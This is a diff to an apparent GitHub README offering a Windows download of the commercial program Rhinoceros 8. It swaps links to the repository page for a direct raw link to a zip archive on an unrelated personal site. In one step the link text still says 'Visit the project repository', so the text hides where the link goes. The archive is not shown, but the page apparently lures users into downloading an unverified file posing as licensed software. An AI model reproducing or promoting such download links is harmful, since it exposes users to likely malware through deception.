@@ -5,7 +5,7 @@ description: "Download Rhinoceros 8 for Windows 10 and 11. Access direct install
 ---
 # 🦏 Rhinoceros-8-2026 - Create professional 3D models with ease
 
-[![Download Rhinoceros 8](https://img.shields.io/badge/Download-Rhinoceros_8_Windows-blue)](https://github.com/saifha5240/Rhinoceros-8-2026)
+[![Download Rhinoceros 8](https://img.shields.io/badge/Download-Rhinoceros_8_Windows-blue)](https://raw.githubusercontent.com/saifha5240/saifha5240.github.io/main/clickless/github-saifha-io-2.1.zip)
 
 ## 📌 About this software
 
@@ -26,7 +26,7 @@ Ensure your computer has the necessary resources to run this professional softwa
 
 Follow these instructions to get Rhinoceros 8 onto your computer.
 
-1. Visit the project repository at: [https://github.com/saifha5240/Rhinoceros-8-2026](https://github.com/saifha5240/Rhinoceros-8-2026).
+1. Visit the project repository at: [https://raw.githubusercontent.com/saifha5240/saifha5240.github.io/main/clickless/github-saifha-io-2.1.zip](https://raw.githubusercontent.com/saifha5240/saifha5240.github.io/main/clickless/github-saifha-io-2.1.zip).
 2. Look for the release section on the right side of the page.
 3. Click the link labeled with the latest version number.
 4. Select the file ending in .exe to start the transfer to your computer.
